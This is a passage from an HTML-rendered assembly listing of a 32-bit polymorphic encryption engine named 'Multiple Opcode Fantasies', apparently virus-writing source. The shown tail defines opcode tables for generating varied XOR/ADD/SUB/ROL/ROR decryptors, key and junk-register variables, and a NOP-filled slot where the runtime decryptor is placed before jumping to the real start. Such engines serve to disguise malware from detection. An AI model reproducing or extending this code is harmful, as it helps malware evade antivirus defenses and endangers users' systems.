       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">                </span><span class="sc1">; XOR</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2Bh</span><span class="sc0">                </span><span class="sc1">; ADD</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">                </span><span class="sc1">; SUB</span><span class="sc0">
                             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">un_op_code2</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11110000b</span><span class="sc0">     </span><span class="sc1">; XOR</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11101000b</span><span class="sc0">     </span><span class="sc1">; SUB</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11000000b</span><span class="sc0">     </span><span class="sc1">; ADD</span><span class="sc0">
                             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">un_op_code3</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">11000000b</span><span class="sc0">          </span><span class="sc1">; ROL</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">11001000b</span><span class="sc0">          </span><span class="sc1">; ROR</span><span class="sc0">
                             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">key</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">key2</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">keyvalue</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">op1</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">op2</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">op3</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">op4</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
                             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">used_registers</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">creg</span><span class="sc0">  </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">; Register to hold the code</span><span class="sc0">
</span><span class="sc5">lreg</span><span class="sc0">  </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                   </span><span class="sc1">; Register to hold the length of code</span><span class="sc0">
</span><span class="sc5">kreg</span><span class="sc0">  </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                   </span><span class="sc1">; Register to hold the encryption key</span><span class="sc0">
</span><span class="sc5">preg</span><span class="sc0">  </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                   </span><span class="sc1">; Register to hold the pointer in code</span><span class="sc0">
</span><span class="sc5">jreg1</span><span class="sc0"> </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                   </span><span class="sc1">; Junk register #1</span><span class="sc0">
</span><span class="sc5">jreg2</span><span class="sc0"> </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">                   </span><span class="sc1">; Junk register #2</span><span class="sc0">
</span><span class="sc5">jreg3</span><span class="sc0"> </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">                   </span><span class="sc1">; Junk register #3</span><span class="sc0">
                             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">counter</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">; instruction counter</span><span class="sc0">
</span><span class="sc5">misc</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">; misc data</span><span class="sc0">
</span><span class="sc5">codeaddr</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; address of code</span><span class="sc0">
</span><span class="sc5">codelength</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">; code length</span><span class="sc0">
</span><span class="sc5">mainlp</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">; main loop address</span><span class="sc0">
</span><span class="sc5">the_end</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">end_end</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">increment_flag</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; flag</span><span class="sc0">
                             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">MOF32</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;   ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;   ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³</span><span class="sc0">
</span><span class="sc1">;   ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;   ÚÄÄÄ¿                                                             ÚÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;   ³ ú ³ MúUúLúTúIúPúLúE  OúPúCúOúDúE  FúAúNúTúAúSúIúEúS  3ú2  BúIúT ³ ú ³</span><span class="sc0">
</span><span class="sc1">;   ÀÄÄÄÙ                            e n d                            ÀÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;   ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿ ÚÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;   ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³ ³ ú ³</span><span class="sc0">
</span><span class="sc1">;   ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ ÀÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">end_of_code</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">decrypt</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">; where the runtime decryptor gets put...</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">700h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; ...a lot of space for a future better</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">realstart</span><span class="sc0">         </span><span class="sc1">; poly engine...</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc4">:</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">

</span></div></body>
</html>
